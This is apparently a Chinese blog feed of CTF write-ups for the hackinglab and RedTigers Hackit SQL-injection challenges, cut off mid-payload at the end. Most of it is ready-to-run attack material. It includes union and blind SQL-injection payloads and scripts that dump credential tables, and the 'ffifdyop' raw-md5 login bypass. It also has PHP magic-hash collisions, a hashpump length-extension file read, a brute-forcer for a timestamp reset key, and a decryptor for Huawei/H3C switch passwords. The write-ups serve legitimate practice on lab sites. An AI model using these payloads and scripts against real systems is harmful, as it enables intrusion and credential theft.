title="盲注"></a>盲注</h2><p>sqlmap可以跑出来，网络连接不太好容易断。</p><h2 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h2><p>在cookie后面加上了一个id=\,报错<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Cookie: PHPSESSID=9f5169cbfb23ef8e10ca86f02cae97c9;id=\</span><br></pre></td></tr></table></figure></p><p>得到字段长度<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Cookie: PHPSESSID=9f5169cbfb23ef8e10ca86f02cae97c9;id=2 order by 4</span><br></pre></td></tr></table></figure></p><p>得到显示位<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Cookie: PHPSESSID=9f5169cbfb23ef8e10ca86f02cae97c9;id=0 union select 1,2,3</span><br></pre></td></tr></table></figure></p><p>得到表名<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Cookie: PHPSESSID=9f5169cbfb23ef8e10ca86f02cae97c9;id=0 union select 1,2,(select group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=database())</span><br></pre></td></tr></table></figure></p><p>得到字段名<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Cookie: PHPSESSID=9f5169cbfb23ef8e10ca86f02cae97c9;id=0 union select 1,2,(select group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_name=<span class="string">'sae_manager_sqli8'</span>)</span><br></pre></td></tr></table></figure></p><p>脱裤<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Cookie: PHPSESSID=9f5169cbfb23ef8e10ca86f02cae97c9;id=0 union select id,username,password from sae_manager_sqli8</span><br></pre></td></tr></table></figure></p><h2 id="哈希后的密码是不能产生注入的"><a href="#哈希后的密码是不能产生注入的" class="headerlink" title="哈希后的密码是不能产生注入的"></a>哈希后的密码是不能产生注入的</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">PLEASE LOGINT!&lt;noscript&gt;&lt;?php</span><br><span class="line">include <span class="string">"config.php"</span>;</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'userid'</span>]) &amp;&amp; isset(<span class="variable">$_GET</span>[<span class="string">'pwd'</span>]))&#123;</span><br><span class="line">   <span class="variable">$strsql</span>=<span class="string">"select * from `user` where userid="</span>.intval(<span class="variable">$_GET</span>[<span class="string">'userid'</span>]).<span class="string">" and password='"</span>.md5(<span class="variable">$_GET</span>[<span class="string">'pwd'</span>], <span class="literal">true</span>) .<span class="string">"'"</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$conn</span>=mysql_connect(<span class="variable">$dbhost</span>,<span class="variable">$username</span>,<span class="variable">$pwd</span>);</span><br><span class="line">    mysql_select_db(<span class="variable">$db</span>,<span class="variable">$conn</span>);</span><br><span class="line">    <span class="variable">$result</span>=mysql_query(<span class="variable">$strsql</span>);</span><br><span class="line">    print_r(mysql_error());</span><br><span class="line">    <span class="variable">$row</span>=mysql_fetch_array(<span class="variable">$result</span>);</span><br><span class="line">    mysql_close(<span class="variable">$conn</span>);</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">    print_r(<span class="variable">$row</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;/pre&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>!=null)&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"Flag: "</span>.<span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"PLEASE LOGINT!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;noscript&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> file_get_contents(__FILE__);</span><br></pre></td></tr></table></figure><p>其中最关键的语句是</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">select * from user <span class="built_in">where</span> userid=<span class="string">".intval(<span class="variable">$_GET</span>['userid'])."</span> and password=<span class="string">'".md5($_GET['</span><span class="built_in">pwd</span><span class="string">'], true) ."'</span>。</span><br></pre></td></tr></table></figure><p>对传入的userid使用了intval()函数转化为数字，同时将password使用md5()函数进行转化。这就是一个典型的MD5加密后的SQL注入。<br>其中最主要的就是md5()函数，当第二个参数为true时，会返回16字符的二进制格式。当为false的时候，返回的就是32字符十六进制数。默认的是false模式。具体的差别通过下面这个代码来看。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">md5(<span class="string">"123456"</span>);e10adc3949ba59abbe56e057f20f883e</span><br><span class="line">md5(<span class="string">"123456"</span>,<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>可以看到当参数为true的时候，md5之后的值就会乱码。<br>那么只要md5(str,true)之后的值是包含了’or’<trash>这样的字符串，那么sql语句就会变为select 8 from users where usrid=”XXX” and password=’’or’<trash>‘。如此就可以绕过了。那么这样的str字符串存在吗？所幸还好存在一个，就是ffifdyop。那么我们最终的payload就是：</trash></trash></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://lab1.xseclab.com/code1_9f44bab1964d2f959cf509763980e156/?userid=1&amp;<span class="built_in">pwd</span>=ffifdyop</span><br></pre></td></tr></table></figure><p>或者<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://lab1.xseclab.com/code1_9f44bab1964d2f959cf509763980e156/?userid=1&amp;<span class="built_in">pwd</span>=129581926211651571912466741651878684928</span><br></pre></td></tr></table></figure></p><h1 id="解密关"><a href="#解密关" class="headerlink" title="解密关"></a>解密关</h1><h2 id="以管理员身份登录系统"><a href="#以管理员身份登录系统" class="headerlink" title="以管理员身份登录系统"></a>以管理员身份登录系统</h2><p>sukey 值是为时间戳取整，MD5加密而来的<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">import requests</span><br><span class="line">import hashlib</span><br><span class="line">import time</span><br><span class="line">se=requests.session()</span><br><span class="line">header=&#123;<span class="string">'Cookie'</span>:<span class="string">'PHPSESSID=c55e14d0b2191166af88d0ac03c48113'</span>&#125;</span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    sukey=hashlib.new(<span class="string">'md5'</span>,str(int(time.time())).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">    url=<span class="string">"http://lab1.xseclab.com/password1_dc178aa12e73cfc184676a4100e07dac/reset.php?sukey="</span>+sukey+<span class="string">"&amp;username=admin"</span></span><br><span class="line">    r=se.get(url,headers=header)</span><br><span class="line">    time.sleep(0.5)</span><br><span class="line">    <span class="keyword">if</span> r.content:</span><br><span class="line">        <span class="built_in">print</span>(r.content)</span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">'Cracking:'</span>+sukey)</span><br></pre></td></tr></table></figure></p><h2 id="邂逅对门的妹纸"><a href="#邂逅对门的妹纸" class="headerlink" title="邂逅对门的妹纸"></a>邂逅对门的妹纸</h2><p> 先生成字典。<br> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">with open(<span class="string">"password.txt"</span>,<span class="string">"w"</span>) as f:</span><br><span class="line">   <span class="keyword">for</span> year <span class="keyword">in</span> range(1933,1936):</span><br><span class="line">       <span class="keyword">for</span> month <span class="keyword">in</span> range(1,13):</span><br><span class="line">           <span class="keyword">for</span> day <span class="keyword">in</span> range(1,32):</span><br><span class="line">               f.write(<span class="string">"%d%02d%02d\n"</span>%(year,month,day))</span><br></pre></td></tr></table></figure></p><p>  用 EWSA 爆破失败，不知啥原因，以后再研究。</p><h2 id="思科密码破解"><a href="#思科密码破解" class="headerlink" title="思科密码破解"></a>思科密码破解</h2><p><a href="http://www.ifm.net.nz/cookbooks/passwordcracker.html" target="_blank" rel="noopener">在线解密</a></p><h2 id="uawei-h3c-交换机的加密密码"><a href="#uawei-h3c-交换机的加密密码" class="headerlink" title="uawei/h3c 交换机的加密密码"></a>uawei/h3c 交换机的加密密码</h2><p>在window下无法运行此脚本，在kail下即可得。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">from Crypto.Cipher import DES</span><br><span class="line"></span><br><span class="line">def decode_char(c):</span><br><span class="line">    <span class="keyword">if</span> c == <span class="string">'a'</span>:</span><br><span class="line">        r = <span class="string">'?'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = c</span><br><span class="line">    <span class="built_in">return</span> ord(r) - ord(<span class="string">'!'</span>)</span><br><span class="line"></span><br><span class="line">def ascii_to_binary(s):</span><br><span class="line">    assert len(s) == 24</span><br><span class="line">    out = [0]*18</span><br><span class="line">    i = 0</span><br><span class="line">    j = 0</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(0, len(s), 4):</span><br><span class="line">        y = decode_char(s[i + 0])</span><br><span class="line">        y = (y &lt;&lt; 6) &amp; 0xffffff</span><br><span class="line">        k = decode_char(s[i + 1])</span><br><span class="line">        </span><br><span class="line">        y = (y | k) &amp; 0xffffff</span><br><span class="line">        y = (y &lt;&lt; 6) &amp; 0xffffff</span><br><span class="line">        k = decode_char(s[i + 2])</span><br><span class="line">        </span><br><span class="line">        y = (y | k) &amp; 0xffffff</span><br><span class="line">        y = (y &lt;&lt; 6) &amp; 0xffffff</span><br><span class="line">        k = decode_char(s[i + 3])</span><br><span class="line">        y = (y | k) &amp; 0xffffff</span><br><span class="line"></span><br><span class="line">        out[j+2] = chr(y       &amp; 0xff)</span><br><span class="line">        out[j+1] = chr((y&gt;&gt;8)  &amp; 0xff)</span><br><span class="line">        out[j+0] = chr((y&gt;&gt;16) &amp; 0xff)</span><br><span class="line"></span><br><span class="line">        j += 3</span><br><span class="line">    <span class="built_in">return</span> <span class="string">""</span>.join(out)</span><br><span class="line"></span><br><span class="line">def decrypt_password(p):</span><br><span class="line">    r = ascii_to_binary(p)</span><br><span class="line">    r = r[:16]</span><br><span class="line">    d = DES.new(<span class="string">"\x01\x02\x03\x04\x05\x06\x07\x08"</span>, DES.MODE_ECB)</span><br><span class="line">    r = d.decrypt(r)</span><br><span class="line">    <span class="built_in">return</span> r.rstrip(<span class="string">"\x00"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    miwen = <span class="string">"aK9Q4I)J'#[Q=^Q`MAF4&lt;1!!"</span></span><br><span class="line">    <span class="built_in">print</span> u<span class="string">'明文'</span> + decrypt_password(miwen)</span><br><span class="line">    </span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line"><span class="comment">## 异常数据</span></span><br><span class="line"></span><br><span class="line">字母全部转换为大写的base64。</span><br><span class="line"></span><br><span class="line">``` bash</span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">import re</span><br><span class="line">from base64 import *</span><br><span class="line"></span><br><span class="line">def change(res,arr,pos):</span><br><span class="line">    res.append(<span class="string">''</span>.join(arr))</span><br><span class="line">    i=pos</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(i,len(arr)):</span><br><span class="line">        <span class="keyword">if</span> arr[i]&lt;=<span class="string">'Z'</span> and arr[i]&gt;=<span class="string">'A'</span>:</span><br><span class="line">            arr[i]=arr[i].lower()</span><br><span class="line">            change(res,arr,i+1)</span><br><span class="line">            arr[i]=arr[i].upper()</span><br><span class="line"></span><br><span class="line">arr=list(<span class="string">'AGV5IULSB3ZLVSE='</span>)</span><br><span class="line">res=[]</span><br><span class="line">change(res,arr,0)</span><br><span class="line"></span><br><span class="line">res_decode=map(b64decode,res)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res_decode:</span><br><span class="line">    <span class="keyword">if</span> re.findall(r<span class="string">'\\x'</span>,repr(i)):</span><br><span class="line">        <span class="built_in">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure></p><h2 id="md5真的能碰撞嘛"><a href="#md5真的能碰撞嘛" class="headerlink" title="md5真的能碰撞嘛?"></a>md5真的能碰撞嘛?</h2><p><a href="https://www.waitalone.cn/php-sec-bugs.html" target="_blank" rel="noopener">php特性隐患</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$flag</span>=FLAG;</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">"password"</span>]))&#123;</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">'password'</span>];</span><br><span class="line">    <span class="variable">$rootadmin</span>=<span class="string">"!1793422703!"</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$rootadmin</span>)&#123;die(<span class="string">"Please do not attack admin account!"</span>);&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(md5(<span class="variable">$password</span>)==md5(<span class="variable">$rootadmin</span>))&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        die(<span class="string">"Password Error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>$rootadmin加密后的值为<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">md5(!1793422703!,32) = 0e332932043729729062996282883873</span><br><span class="line">md5(QNKCDZO,32) = 0e830400451993494058024219903391</span><br><span class="line">md5(240610708,32) = 0e462097431906509019562988736854</span><br></pre></td></tr></table></figure></p><p>构造payload: ?password=QNKCDZO</p><h2 id="有签名限制的读取任意文件"><a href="#有签名限制的读取任意文件" class="headerlink" title="有签名限制的读取任意文件"></a>有签名限制的读取任意文件</h2><p><a href="http://www.cnblogs.com/pcat/p/5478509.html" target="_blank" rel="noopener">哈希长度扩展攻击的简介以及HashPump安装使用方法</a></p><p><a href="http://blog.csdn.net/zhankehua/article/details/51865788" target="_blank" rel="noopener">解法原文</a></p><p>在kail下使用hashpump<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashpump -s f3d366138601b5afefbd4fc15731692e -d /etc/hosts -k 32 -a chen</span><br></pre></td></tr></table></figure></p><p>得到，包’\x’换成%<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">3998b374350d22991b9c8f9885194a16</span><br><span class="line">/etc/hosts\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00P\x01\x00\x00\x00\x00\x00\x00chen</span><br></pre></td></tr></table></figure></p><p>构造payload:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?filepath=/etc/hosts%80%00%00%00%00%00%00%00%00%00%00%00%00%00P%01%00%00%00%00%00%00chen</span><br><span class="line">&amp;sign=3998b374350d22991b9c8f9885194a16</span><br></pre></td></tr></table></figure></p><h1 id="综合关"><a href="#综合关" class="headerlink" title="综合关"></a>综合关</h1><h2 id="渗透测试第一期"><a href="#渗透测试第一期" class="headerlink" title="渗透测试第一期"></a>渗透测试第一期</h2><p>首先有注册和修改密码的选项，先注册一个账号并绑定手机号（查看网页源码得到），注册成功后，知道只有用admin账户登入，才能得到key。到忘记密码<br>选项去修改密码，发现弹不出手机的验证码。可以猜测到管理员的账号绑定的不是这个手机。突然想起在注册账号的时候有手机绑定，在手机绑定的时候，抓包，把用户名改成admin.绑定成功。然后在回到修改密码哪里，现在可以弹出验证码。修改后。弹出密码。用这个密码登入admin账户，登入成功。</p><h2 id="没有注入到底能不能绕过登录"><a href="#没有注入到底能不能绕过登录" class="headerlink" title="没有注入到底能不能绕过登录"></a>没有注入到底能不能绕过登录</h2><p>通过robots.txt中可知一个不可访问的文件，直接访问，提示要先登入。<br>用admin账户，密码随便，登入，提示密码错误，不管弹框，直接输入刚才不可访问文件的链接，得到key。原来后台没有对登入账户进行校验，只要保持一个session就行。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">r = requests.Session()</span><br><span class="line">url = <span class="string">'http://lab1.xseclab.com/pentest3_307c0281537de1615673af8c1d54885a/'</span></span><br><span class="line">data = &#123;<span class="string">'username'</span>: <span class="string">'admin'</span>, <span class="string">'password'</span>: <span class="string">'123'</span>&#125;</span><br><span class="line">r.post(url, data=data)</span><br><span class="line">url2 = <span class="string">'http://lab1.xseclab.com/pentest3_307c0281537de1615673af8c1d54885a/myadminroot/'</span></span><br><span class="line"><span class="built_in">print</span> (r.get(url2).content)</span><br></pre></td></tr></table></figure></p><p><a href="https://www.40huo.cn/blog/hackinglab-comp.html" target="_blank" rel="noopener">后面一些题目的解答</a></p>]]></content>
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>RedTigers Hackit writeup</title>
      <link href="/posts/90656973.html"/>
      <url>/posts/90656973.html</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a href="http://redtiger.labs.overthewire.org/" target="_blank" rel="noopener">RedTigers Hackit</a>一个不错的sql注入外国平台，也灵活，可以学到很多。<br><a id="more"></a></p><h1 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h1><p>常规的注入</p><p>爆字段<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://redtiger.labs.overthewire.org/level1.php?cat=1 order by 4 <span class="comment">#</span></span><br></pre></td></tr></table></figure></p><p>看显示位<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,3,4 <span class="comment">#</span></span><br></pre></td></tr></table></figure></p><p>表名已经提示，根据登录表单，猜测字段username,password</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,username,password from level1_users <span class="comment">#</span></span><br></pre></td></tr></table></figure><p>得到用户名和密码，登入后得到flag和下一关的密码 4_is_not_random</p><h1 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h1><p>万能密码登入<br>admin’ or 1=1%23<br>admin’ or ‘1’=’1<br>admin’ or ‘1’=’1’%23</p><p>得下一关密码 feed_your_cat_before_your_cat_feeds_you</p><h1 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h1><p>通过user[] 变为数组报错，</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://redtiger.labs.overthewire.org/level3.php?usr[]=MDQyMjExMDE0MTgyMTQw</span><br></pre></td></tr></table></figure><p>访问<a href="http://redtiger.labs.overthewire.org/urlcrypt.inc" target="_blank" rel="noopener">http://redtiger.labs.overthewire.org/urlcrypt.inc</a> 的到加密机密的代码</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// warning! ugly code ahead :)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">function</span> encrypt(<span class="variable">$str</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$cryptedstr</span> = <span class="string">""</span>;</span><br><span class="line">srand(3284724);</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> =0; <span class="variable">$i</span> &lt; strlen(<span class="variable">$str</span>); <span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$temp</span> = ord(substr(<span class="variable">$str</span>,<span class="variable">$i</span>,1)) ^ rand(0, 255);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(strlen(<span class="variable">$temp</span>)&lt;3)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$temp</span> = <span class="string">"0"</span>.<span class="variable">$temp</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cryptedstr</span> .= <span class="variable">$temp</span>. <span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">return</span> base64_encode(<span class="variable">$cryptedstr</span>);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">function</span> decrypt (<span class="variable">$str</span>)</span><br><span class="line">&#123;</span><br><span class="line">srand(3284724);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'%^[a-zA-Z0-9/+]*=&#123;0,2&#125;$%'</span>,<span class="variable">$str</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$str</span> = base64_decode(<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$str</span> != <span class="string">""</span> &amp;&amp; <span class="variable">$str</span> != null &amp;&amp; <span class="variable">$str</span> != <span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$decStr</span> = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=0; <span class="variable">$i</span> &lt; strlen(<span class="variable">$str</span>); <span class="variable">$i</span>+=3)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$array</span>[<span class="variable">$i</span>/3] = substr(<span class="variable">$str</span>,<span class="variable">$i</span>,3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach(<span class="variable">$array</span> as <span class="variable">$s</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$s</span> ^ rand(0, 255);</span><br><span class="line"><span class="variable">$decStr</span> .= chr(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">return</span> <span class="variable">$decStr</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>一开始，我是在window下进行加密的，但是做了很久一直做不出来，后来看了，别人的writeup，原来要在linux下运行。</p><p>判断字段</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">原语句：</span><br><span class="line">http://redtiger.labs.overthewire.org/level3.php?usr=Admin&apos;order by 7 #</span><br><span class="line">加密后：</span><br><span class="line">http://redtiger.labs.overthewire.org/level3.php?usr=MDQyMjExMDE0MTgyMTQwMTc0MjIzMDg3MjA4MTAxMTg0MTQyMDA5MTczMDA2MDY5MjMyMDY1MTkw</span><br></pre></td></tr></table></figure><p>显示位</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">原语句：</span><br><span class="line">http://redtiger.labs.overthewire.org/level3.php?usr=spoock&apos; union select 1,2,3,4,5,6,7 #</span><br><span class="line">加密后：</span><br><span class="line">http://redtiger.labs.overthewire.org/level3.php?usr=MDI0MTk5MDEyMTc2MTI5MjI2MjE2MDI0MjE1MTExMTgwMTQ3MDcxMjM5MDEyMDAwMTc5MDA0MjU0MDMwMDQ1MjE4MjQzMTk3MDcyMjMzMTMwMjAwMTY5MTIxMTUzMTk4MDQwMDQ3MjQwMTk3</span><br></pre></td></tr></table></figure><p>得到显示位2,4,5,6,7</p><p>爆密码：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">原语句：</span><br><span class="line">http://redtiger.labs.overthewire.org/level3.php?usr=spoock&apos; union select 1,password,3,4,5,6,7 from level3_users where username=0x41646d696e #&quot;</span><br><span class="line"></span><br><span class="line">加密后：</span><br><span class="line">http://redtiger.labs.overthewire.org/level3.php?usr=MDI0MTk5MDEyMTc2MTI5MjI2MjE2MDI0MjE1MTExMTgwMTQ3MDcxMjM5MDEyMDAwMTc5MDA0MjU0MDMwMDQ1MjE4MjQzMTM1MDA1MTY5MjIxMTM5MjM0MDYyMjA5MjIwMDU1MDUyMjI4MjAyMTUxMjI3MDQwMTA0MjMxMjIwMDM5MTM2MTYzMTczMDY0MTk5MDcxMTM2MTE1MDkyMjE3MTY5MDkzMDYxMTgxMTY1MDU3MTE4MDg0MTUxMDM0MDg1MTI1MDU1MTIzMjAwMTMwMDk1MTQ1MjE3MDcxMDM2MTQzMTk4MTIyMDM5MTQ3MDE5MDM4MTQzMDQ5MjAyMTUwMDc1MDQ3MTYwMTE5</span><br></pre></td></tr></table></figure></p><p>得到密码：thisisaverysecurepasswordEEE5rt<br>得到下一关的：there_is_no_bug </p><h1 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h1><p>布尔的盲注</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">import string</span><br><span class="line">from re import *</span><br><span class="line">from urllib.request import *</span><br><span class="line"></span><br><span class="line">answer = <span class="string">""</span></span><br><span class="line">char = string.printable</span><br><span class="line"> cookies  = &#123;   <span class="string">"level2login"</span>: <span class="string">"4_is_not_random"</span>,</span><br><span class="line">        <span class="string">"level3login"</span>: <span class="string">"feed_your_cat_before_your_cat_feeds_you"</span>,</span><br><span class="line">        <span class="string">"level4login"</span>: <span class="string">"there_is_no_bug"</span>,</span><br><span class="line">        <span class="string">"level5login"</span>: <span class="string">"there_is_a_truck"</span>&#125;</span><br><span class="line">url = <span class="string">"http://redtiger.labs.overthewire.org/level4.php?id=1%20and%201=(select%20count(*)%20from%20level4_secret%20where%20substr(keyword,&#123;0&#125;,1)='&#123;1&#125;')"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> q <span class="keyword">in</span> range(1, 22):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> char:</span><br><span class="line">        <span class="built_in">test</span> = (url.format(q, i))</span><br><span class="line">        request = Request(<span class="built_in">test</span>, None, headers=cookies)</span><br><span class="line">        res = urlopen(request)</span><br><span class="line">        s = res.read().decode()</span><br><span class="line">        <span class="keyword">if</span> (findall(<span class="string">"Query returned 1 rows."</span>, s)):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"&#123;0&#125;  "</span>.format(q) + i)</span><br><span class="line">            answer += i</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(answer)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line">def exe_get(url):</span><br><span class="line">    cookies = &#123;</span><br><span class="line">        <span class="string">"level2login"</span>: <span class="string">"4_is_not_random"</span>,</span><br><span class="line">        <span class="string">"level3login"</span>: <span class="string">"feed_your_cat_before_your_cat_feeds_you"</span>,</span><br><span class="line">        <span class="string">"level4login"</span>: <span class="string">"there_is_no_bug"</span>,</span><br><span class="line">        <span class="string">"level5login"</span>: <span class="string">"there_is_a_truck"</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.get(url, cookies=cookies)</span><br><span class="line">    html = response.text</span><br><span class="line">    match = re.search(<span class="string">'0'</span>, html)</span><br><span class="line">    <span class="comment"># 表示值偏大</span></span><br><span class="line">    <span class="keyword">if</span> match:</span><br><span class="line">        <span class="built_in">return</span> -1</span><br><span class="line">    <span class="comment"># 表示值偏小</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">return</span> 1</span><br><span class="line">def get_data_char(i):</span><br><span class="line">    url_template = <span class="string">"https://redtiger.labs.overthewire.org/level4.php?id=2 or ascii(substr((select keyword from level4_secret),&#123;0&#125;,1))&gt;&#123;1&#125;"</span></span><br><span class="line">    low,high = 48,126</span><br><span class="line">    <span class="keyword">while</span> low&lt;=high:</span><br><span class="line">        mid = (low+high)//2</span><br><span class="line">        url = url_template.format(i,mid)</span><br><span class="line">        result = exe_get(url)</span><br><span class="line">        <span class="keyword">if</span> result&gt;0:</span><br><span class="line">            low = mid+1</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high=mid-1</span><br><span class="line">        <span class="built_in">print</span>(low,high,mid)</span><br><span class="line">    <span class="built_in">print</span>(low)</span><br><span class="line">    <span class="built_in">return</span> low</span><br><span class="line"></span><br><span class="line">def get_data():</span><br><span class="line">    data=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(1,18):</span><br><span class="line">        char=get_data_char(i)</span><br><span class="line">        data += chr(char)</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">get_data()</span><br></pre></td></tr></table></figure><h1 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h1><p>post请求,即可<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">username=1<span class="string">'union select 1,md5(1)%23&amp;password=1&amp;login=Login</span></span><br></pre></td></tr></table></figure></p><p>得到下一关的：for_more_bugs_update_to_php7</p><h1 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h1><p>一开始加上’报错，开始判断列数<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://redtiger.labs.overthewire.org/level6.php?user=3 order by 5<span class="comment">#</span></span><br></pre></td></tr></table></figure></p><p>判断显示位的时候，出现user not found<br>猜测后台可能进行了二次查询<br>尝试一下语句，一直没成功，应该是’引发报错，导致后面无法显示。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://redtiger.labs.overthewire.org/level6.php</span><br><span class="line">?user=1<span class="string">' union select 1,username ,3,4,5 from level6_users where status=1 